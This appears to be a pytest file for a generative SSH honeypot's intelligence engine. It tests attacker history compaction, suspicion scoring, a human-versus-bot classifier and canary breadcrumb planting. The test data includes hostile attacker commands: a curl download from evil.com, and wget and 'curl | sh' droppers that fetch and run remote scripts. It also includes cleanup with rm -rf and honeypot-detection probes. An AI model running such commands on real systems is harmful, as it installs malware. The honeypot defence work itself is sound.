"""
Unit and Integration Tests for Paper 2 Future Work:
shelLM Advanced Honeypot Intelligence Engine
Features tested:
1. Advanced Semantic History Compaction & Sliding Window Memory
2. Attacker Suspicion Scoring & Detection Evasion Fingerprint Tracking
3. Human vs Bot Behavioral Classifier (Timing cadence, command piping, dropper signatures)
4. Dynamic Decoy Breadcrumb Engine (Contextual lure generation)
5. Integration into GenerativeHoneypotEngine and record_honeypot_interaction
"""

import pytest
import time
import uuid
from unittest.mock import AsyncMock, patch, MagicMock

from app.services.honeypot_intelligence import (
    AdvancedHoneypotHistoryManager,
    AttackerSuspicionAnalyzer,
    HumanVsBotClassifier,
    DecoyBreadcrumbEngine,
    advanced_history_manager,
    attacker_suspicion_analyzer,
    human_vs_bot_classifier,
    decoy_breadcrumb_engine,
)
from app.services.generative_honeypot import (
    HoneypotSessionState,
    generative_honeypot_engine,
)
from app.agents.honeypot_agent import record_honeypot_interaction
from app.database.postgres import async_session_factory
from app.models.security_entities import HoneypotSession


def test_semantic_history_compaction():
    """Verify that history compaction preserves critical investigation state and summarizes older commands."""
    manager = AdvancedHoneypotHistoryManager(window_size=3)
    history = []

    # Attacker runs several reconnaissance and manipulation commands
    cmds = [
        ("ls /etc", "passwd shadow hosts"),
        ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash"),
        ("touch /tmp/malware.sh", ""),
        ("curl http://evil.com/drop -o /tmp/drop", "download complete"),
        ("find / -perm -4000", "/usr/bin/sudo /usr/bin/passwd"),
        ("whoami", "root"),
    ]

    for c, r in cmds:
        history.append({"command": c, "response": r, "timestamp": time.time()})

    full_context, summary = manager.compact_history(history)
    assert "[Active Recent Commands]:" in full_context
    assert "$ whoami" in full_context
    assert summary["total_commands_compacted"] == 3
    assert any("/etc/passwd" in f for f in summary.get("files_investigated", []))
    assert any("malware" in a or "drop" in a for a in summary.get("artifacts_created", []))


def test_attacker_suspicion_analyzer():
    """Verify that honeypot fingerprinting commands trigger suspicion scoring."""
    analyzer = AttackerSuspicionAnalyzer()

    # Normal commands should have low suspicion
    res_norm = analyzer.analyze_suspicion("ls -la /var/log", current_suspicion_score=0.0)
    assert res_norm["suspicion_score"] == 0.0
    assert res_norm["level"] == "LOW"
    assert len(res_norm["signals_detected"]) == 0

    # Hypervisor and honeypot check commands should escalate suspicion
    res1 = analyzer.analyze_suspicion("dmesg | grep -i qemu", current_suspicion_score=0.0)
    assert res1["suspicion_score"] > 0
    assert len(res1["signals_detected"]) > 0

    res2 = analyzer.analyze_suspicion("cat /proc/net/tcp", current_suspicion_score=res1["suspicion_score"])
    assert res2["suspicion_score"] > res1["suspicion_score"]

    res3 = analyzer.analyze_suspicion("ls /etc/cowrie || cat /proc/modules", current_suspicion_score=res2["suspicion_score"])
    assert res3["suspicion_score"] >= 40
    assert res3["level"] in ["ELEVATED", "CRITICAL_DETECTION_RISK"]


def test_human_vs_bot_classifier():
    """Verify heuristic classification between human operators, automated bot scanners, and hybrid scripts."""
    classifier = HumanVsBotClassifier()

    # Case 1: Automated bot / dropper payload
    bot_history = [
        {"command": "cd /tmp; wget http://192.168.1.5/x.sh; chmod +x x.sh; ./x.sh", "timestamp": 1000.0},
        {"command": "curl -s http://192.168.1.5/bot.bin | sh", "timestamp": 1000.2},
        {"command": "rm -rf /tmp/x.sh", "timestamp": 1000.4},
    ]
    res_bot = classifier.analyze_behavior(bot_history)
    assert res_bot["classification"] in ["AUTOMATED_BOT", "HYBRID_SCRIPTED"]
    assert res_bot["bot_score"] >= 0.5

    # Case 2: Human operator with typing cadence and typos
    human_history = [
        {"command": "whoami", "timestamp": 1000.0},
        {"command": "pwd", "timestamp": 1004.2},
        {"command": "sl", "timestamp": 1008.5},  # common typo for ls
        {"command": "ls -la", "timestamp": 1012.1},
        {"command": "cat /etc/passwd", "timestamp": 1018.3},
    ]
    res_human = classifier.analyze_behavior(human_history)
    assert res_human["classification"] == "HUMAN_ATTACKER"
    assert res_human["human_score"] >= 0.5


def test_decoy_breadcrumb_engine():
    """Verify contextual canary generation based on attacker tactics."""
    engine = DecoyBreadcrumbEngine()
    virtual_files = {}

    # When credential access tactic is detected
    planted = engine.plant_breadcrumbs_for_tactic("Credential Access", virtual_files)
    assert len(planted) > 0
    assert "/root/.aws/credentials" in virtual_files
    assert "AKIA_CYBERARY_CANARY_LAB_2026" in virtual_files["/root/.aws/credentials"]

    # When discovery tactic is detected
    planted_disc = engine.plant_breadcrumbs_for_tactic("Discovery", virtual_files)
    assert len(planted_disc) > 0
    assert "/var/backups/cyberary_db_export.sql" in virtual_files


@pytest.mark.asyncio
async def test_honeypot_engine_intelligence_integration():
    """Verify that GenerativeHoneypotEngine uses intelligence engine to populate suspicion, classification, and breadcrumbs."""
    result = await generative_honeypot_engine.execute_shell_command(
        session_id="intel-test-01",
        command="cat /proc/net/tcp && ls /var/backups",
        attacker_ip="192.168.1.150",
    )

    assert "response" in result
    assert "intelligence" in result
    intel = result["intelligence"]
    assert "suspicion_score" in intel
    assert "suspicion_level" in intel
    assert "human_vs_bot" in intel
    assert "planted_breadcrumbs" in intel
    assert intel["suspicion_score"] > 0


@pytest.mark.asyncio
async def test_record_honeypot_interaction_with_intelligence():
    """Verify database persistence of the intelligence metadata via record_honeypot_interaction."""
    uid = uuid.uuid4().hex[:8]
    test_sess_id = f"db-intel-sess-{uid}"
    test_sess_code = f"SESS-{uid.upper()}"

    async with async_session_factory() as session:
        # Create a test honeypot session in DB
        hp_session = HoneypotSession(
            id=test_sess_id,
            session_code=test_sess_code,
            attacker_ip="10.0.0.99",
            protocol="ssh",
            status="active",
        )
        session.add(hp_session)
        await session.commit()

    with patch("app.agents.honeypot_agent.generative_honeypot_engine.execute_shell_command") as mock_exec:
        mock_exec.return_value = {
            "session_id": test_sess_id,
            "response": "sample output",
            "engine": "deterministic_fallback",
            "cwd": "/root",
            "session_metadata": {
                "suspicion_score": 65.0,
                "suspicion_level": "CRITICAL_DETECTION_RISK",
            },
            "intelligence": {
                "suspicion_score": 65.0,
                "suspicion_level": "CRITICAL_DETECTION_RISK",
                "human_vs_bot": {"classification": "HUMAN_ATTACKER", "bot_score": 0.2, "human_score": 0.8},
                "planted_breadcrumbs": [{"path": "/var/backups/cyberary_db_export.sql", "tactic": "Discovery"}],
            }
        }

        async with async_session_factory() as db:
            res = await record_honeypot_interaction(
                db=db,
                session_id=test_sess_id,
                command="cat /etc/passwd",
                attacker_ip="10.0.0.99",
            )

            assert res["session_id"] == test_sess_id
            assert "sample output" in res["response"]
            assert "intelligence" in res
            assert res["intelligence"]["suspicion_score"] == 65.0
            assert res["intelligence"]["human_vs_bot"]["classification"] == "HUMAN_ATTACKER"
